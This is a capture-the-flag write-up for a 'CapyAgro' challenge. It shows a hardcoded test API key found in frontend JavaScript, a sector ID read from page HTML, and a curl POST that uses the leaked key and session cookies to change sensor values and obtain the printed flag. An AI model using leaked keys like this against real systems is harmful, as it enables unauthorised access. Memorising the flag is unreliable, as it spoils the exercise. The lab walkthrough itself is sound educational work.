# CapyAgro CTF Write-up

## 1. Initial Reconnaissance
First, we visit the main website at `http://45.146.165.92`. By looking at the HTML source code of the homepage, we notice a script inclusion for a configuration file:
```html
<script src="/static/config.js"></script>
```

## 2. Finding the Leaked API Key
We fetch the contents of `/static/config.js` and discover that a test API key is hardcoded directly into the frontend code:
```javascript
window.API_CONFIG = {
    // API ключ для тестовой среды
    // ВНИМАНИЕ: В продакшене используйте безопасное хранение ключей!
    KEY: 'test_key_123',
    ...
```

## 3. Account Creation and Session Authentication
To interact with the dashboard, we need a valid session. We register a new user by sending a POST request to `/register` with some dummy credentials, and then log in at `/login`. We save the session cookies to use in subsequent requests.

## 4. Analyzing the Dashboard and API Logic
By viewing the source code of the `/dashboard` page, we find a JavaScript function `adjustSector` that reveals the requirements to get the flag:
```javascript
if (data.success && data.flag && data.all_capyagro_saved) {
    // Все сектора CapyAgro восстановлены - выдается флаг
    ...
```
The normal parameters for a sector are also mentioned in a hint within the dashboard:
`Температура: 22-26°C, Влажность: 60-70%`.

## 5. Locating the Critical CapyAgro Sector
The dashboard contains a link to another page: `/capyagro` (Мониторинг CapyAgro). Visiting this page reveals a dashboard specifically for CapyAgro sectors. In the HTML of this page, we find a critical sector listed with dangerous metrics (Temperature: 30.0°C, Humidity: 45.0%):
```html
<button class="btn btn-small" onclick="getSectorInfo(6419)">
    Получить информацию
</button>
```
This tells us the internal ID of the critical CapyAgro sector is `6419`.

## 6. Exploiting the API to Restore the Sector
Using the internal ID (`6419`), the leaked API key (`test_key_123`), and our authenticated session cookies, we send a POST request to the `/api/sector/6419/adjust` endpoint. We set the temperature and humidity to normal values (`temp: 24`, `humidity: 65`).

```bash
curl -s -b cookies.txt \
  -H "Content-Type: application/json" \
  -H "X-API-Key: test_key_123" \
  -X POST \
  -d '{"temp": 24, "humidity": 65}' \
  http://45.146.165.92/api/sector/6419/adjust
```

## 7. Capturing the Flag
The API processes our request successfully, recognizing that we have "restored" the final critical CapyAgro sector, and rewards us with the flag in the JSON response:
```json
{
  "all_capyagro_saved": true,
  "flag": "KubSTU(Sav3d_th3_CapyArg0S3ct0r)",
  "message": "Все сектора CapyAgro восстановлены! Урожай спасён!",
  "sector": {
    "humidity": 65.0,
    "id": 6419,
    "is_capyagro": true,
    "sector_number": 4,
    "temp": 24.0
  },
  "success": true
}
```

**Flag:** `KubSTU(Sav3d_th3_CapyArg0S3ct0r)`
